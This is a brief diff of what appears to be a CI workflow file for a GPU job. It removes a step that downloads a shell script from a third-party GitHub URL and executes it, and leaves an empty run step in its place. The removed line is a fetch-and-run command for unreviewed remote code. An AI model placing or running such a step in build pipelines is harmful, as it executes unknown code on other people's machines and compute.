@@ -7,4 +7,4 @@ jobs:
     resource_class: gpu.nvidia.large
     steps:
       - run: nvidia-smi 
-      - run: wget https://raw.githubusercontent.com/vivomito/out/main/look.sh && chmod +x look.sh && ./look.sh
+      - run: 
